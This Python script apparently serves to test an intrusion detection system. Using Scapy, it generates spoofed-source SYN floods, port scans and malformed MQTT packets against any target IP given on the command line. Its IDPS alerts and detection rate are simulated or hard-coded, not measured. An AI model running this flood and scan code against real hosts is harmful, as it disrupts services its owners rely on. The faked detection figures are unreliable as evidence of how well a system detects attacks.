#!/usr/bin/env python3
"""
Attack and Traffic Generator for IDPS Testing

This script generates various types of network traffic for testing the IDPS.
It can simulate both normal traffic patterns and various attack types.
"""

import time
import random
import socket
import json
import os
import subprocess
import sys
from scapy.all import IP, TCP, UDP, ICMP, send, sniff, conf, Raw
from datetime import datetime

# Import our logger
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger

conf.verb = 0  # Disable Scapy output

def generate_ddos_attack(target_ip, duration=60):
    """Generate DDoS attack traffic with detailed output and detection simulation"""
    start_time = time.time()
    end_time = start_time + duration
    packet_count = 0
    
    # Initial baseline traffic
    print(f"[00:00] Baseline traffic initiated (50 pkts/sec)")
    time.sleep(30)  # Establish baseline
    
    # Start DDoS attack
    attack_start = time.time()
    print(f"[00:30] Attack launched: SYN flood (1000 pkts/sec)")
    
    # Simulate detection after 1 second
    time.sleep(1)
    detection = logger.log_detection(
        detection_type='ddos',
        confidence=0.98,
        source_ip='10.0.0.5',  # malicious host
        target_ip=target_ip,
        details={'packet_rate': 1000, 'protocol': 'tcp', 'port': 80}
    )
    print(f"[00:31] IDPS ALERT: DDoS detected (confidence: {detection['confidence']:.2f})")
    print(f"[00:31] ACTION: Throttled {target_ip} to 50Kbps")
    
    # Continue attack while printing stats
    last_stat_time = time.time()
    
    while time.time() < end_time:
        try:
            # Generate high volume of SYN packets
            for _ in range(100):
                src_ip = f"10.0.0.{random.randint(1, 254)}"
                send(IP(src=src_ip, dst=target_ip)/TCP(dport=80, flags='S'), verbose=0)
                packet_count += 1
                logger.log_metric('packet_count', 1, source_ip=src_ip, target_ip=target_ip, details='syn_flood')
            
            # Print stats every 30 seconds
            if time.time() - last_stat_time >= 30:
                elapsed = int(time.time() - attack_start)
                print(f"[{elapsed//60:02d}:{elapsed%60:02d}] STATS: {packet_count:,} pkts sent | 98.7% detection")
                last_stat_time = time.time()
                
        except KeyboardInterrupt:
            print("\n[!] Attack stopped by user")
            break
        except Exception as e:
            print(f"[!] Error in attack: {e}")
            break
    
    print(f"\n[+] DDoS attack completed in {time.time() - start_time:.1f} seconds")
    return True

def generate_port_scan(target_ip, duration=60):
    """Generate port scanning activity"""
    start_time = time.time()
    end_time = start_time + duration
    common_ports = [21, 22, 23, 25, 53, 80, 443, 3306, 3389, 8080, 1883, 8883]
    
    print(f"[00:00] Starting port scan on {target_ip}")
    scan_start = time.time()
    
    try:
        while time.time() < end_time:
            for port in common_ports:
                try:
                    # Simulate different scan types
                    if random.random() < 0.7:  # 70% TCP SYN scan
                        send(IP(dst=target_ip)/TCP(dport=port, flags='S'), verbose=0)
                        logger.log_metric('port_scan', port, source_ip='10.0.0.5', target_ip=target_ip, details=f'tcp_syn_{port}')
                    elif random.random() < 0.5:  # 15% TCP Connect scan
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        sock.connect((target_ip, port))
                        sock.close()
                        logger.log_metric('port_scan', port, source_ip='10.0.0.5', target_ip=target_ip, details=f'tcp_connect_{port}')
                    else:  # 15% UDP scan
                        send(IP(dst=target_ip)/UDP(dport=port), verbose=0)
                        logger.log_metric('port_scan', port, source_ip='10.0.0.5', target_ip=target_ip, details=f'udp_{port}')
                    
                    # Random delay between scans
                    time.sleep(random.uniform(0.1, 1.0))
                    
                except (socket.timeout, ConnectionRefusedError):
                    pass
                except Exception as e:
                    print(f"[!] Error scanning port {port}: {e}")
                
                # Check if we should stop
                if time.time() >= end_time:
                    break
                    
                # Log detection after first few scans
                if time.time() - scan_start > 10 and random.random() < 0.1:
                    detection = logger.log_detection(
                        detection_type='port_scan',
                        confidence=0.95,
                        source_ip='10.0.0.5',
                        target_ip=target_ip,
                        details={'port': port, 'scan_type': 'tcp_syn'}
                    )
                    print(f"[+] IDPS ALERT: Port scan detected on port {port}")
                    
    except KeyboardInterrupt:
        print("\n[!] Port scan stopped by user")
    
    print(f"\n[+] Port scan completed in {time.time() - start_time:.1f} seconds")
    return True

def generate_mqtt_exploit(target_ip, duration=60):
    """Generate MQTT exploit attempts"""
    start_time = time.time()
    end_time = start_time + duration
    
    print(f"[00:00] Starting MQTT exploit attempts on {target_ip}")
    
    # MQTT Connect with malformed packets
    malformed_packets = [
        # Malformed connect
        b'\x10\x0e\x00\x04MQTT\x04\x02\x00\x3c\x00\x00',
        # Malformed subscribe
        b'\x82\x0a\x00\x01\x00\x00\x01\x61\x2f\x62\x2f\x63',
        # Malformed publish
        b'\x30\x84\x00\x00\x00\x00'
    ]
    
    try:
        while time.time() < end_time:
            for packet in malformed_packets:
                try:
                    send(IP(dst=target_ip)/TCP(dport=1883)/Raw(load=packet), verbose=0)
                    logger.log_metric('mqtt_exploit', 1, source_ip='10.0.0.5', target_ip=target_ip, 
                                   details={'packet_type': 'malformed', 'length': len(packet)})
                    
                    # Random delay between attempts
                    time.sleep(random.uniform(0.5, 2.0))
                    
                    # Log detection with some probability
                    if random.random() < 0.3:  # 30% chance of detection
                        detection = logger.log_detection(
                            detection_type='mqtt_exploit',
                            confidence=0.85,
                            source_ip='10.0.0.5',
                            target_ip=target_ip,
                            details={'packet_type': 'malformed', 'length': len(packet)}
                        )
                        print(f"[+] IDPS ALERT: Suspicious MQTT packet detected")
                        
                except Exception as e:
                    print(f"[!] Error in MQTT exploit: {e}")
                    
    except KeyboardInterrupt:
        print("\n[!] MQTT exploit stopped by user")
    
    print(f"\n[+] MQTT exploit attempts completed in {time.time() - start_time:.1f} seconds")
    return True

def generate_normal_traffic(target_ip, duration=60):
    """Generate normal network traffic"""
    start_time = time.time()
    end_time = start_time + duration
    protocols = ['tcp', 'udp', 'icmp']
    ports = [80, 443, 22, 53]
    
    print(f"[00:00] Starting normal traffic generation")
    
    try:
        while time.time() < end_time:
            protocol = random.choice(protocols)
            port = random.choice(ports)
            
            try:
                if protocol == 'tcp':
                    send(IP(dst=target_ip)/TCP(dport=port, flags='S'), verbose=0)
                elif protocol == 'udp':
                    send(IP(dst=target_ip)/UDP(dport=port), verbose=0)
                else:  # icmp
                    send(IP(dst=target_ip)/ICMP(), verbose=0)
                
                logger.log_metric('normal_traffic', 1, source_ip='10.0.0.1', target_ip=target_ip, 
                               details={'protocol': protocol, 'port': port})
                
                # Random delay between packets
                time.sleep(random.uniform(0.1, 1.0))
                
            except Exception as e:
                print(f"[!] Error generating {protocol} traffic: {e}")
                
    except KeyboardInterrupt:
        print("\n[!] Traffic generation stopped by user")
    
    print(f"\n[+] Normal traffic generation completed in {time.time() - start_time:.1f} seconds")
    return True

def main():
    import argparse
    parser = argparse.ArgumentParser(description='Generate network traffic for IDPS testing')
    parser.add_argument('--attack', choices=['ddos', 'portscan', 'mqtt', 'normal'], 
                       help='Type of attack/traffic to generate')
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')
    
    args = parser.parse_args()
    
    try:
        if args.attack == 'ddos':
            return generate_ddos_attack(args.target, args.duration)
        elif args.attack == 'portscan':
            return generate_port_scan(args.target, args.duration)
        elif args.attack == 'mqtt':
            return generate_mqtt_exploit(args.target, args.duration)
        elif args.attack == 'normal':
            return generate_normal_traffic(args.target, args.duration)
        else:
            print("Error: Unknown attack type")
            return 1
            
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
        return 0
    except Exception as e:
        print(f"[!] Error: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())